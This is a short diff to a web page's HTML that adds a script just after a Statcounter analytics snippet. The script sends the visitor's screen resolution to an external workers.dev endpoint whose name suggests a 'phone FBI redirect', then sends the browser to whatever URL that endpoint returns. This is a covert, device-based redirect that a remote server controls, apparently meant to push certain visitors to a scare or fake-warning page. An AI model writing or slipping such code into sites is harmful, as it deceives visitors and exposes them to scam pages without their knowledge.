@@ -420,8 +420,17 @@ src="https://c.statcounter.com/12925452/0/2766581d/1/"
 alt="Web Analytics Made Easy - Statcounter"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
-	
+
+<script>
+const screen = `${window.screen.width}x${window.screen.height}`;
+fetch(`https://matus-phone-fbi-redirect.jmk-e2d.workers.dev/?screen=${screen}`)
+  .then(response => {
+    if (response.redirected) {
+      window.location.href = response.url;
+    }
+  })
+  .catch(err => console.log('Redirect check failed:', err));
+</script>
+
 </body>
 </html>
-
-
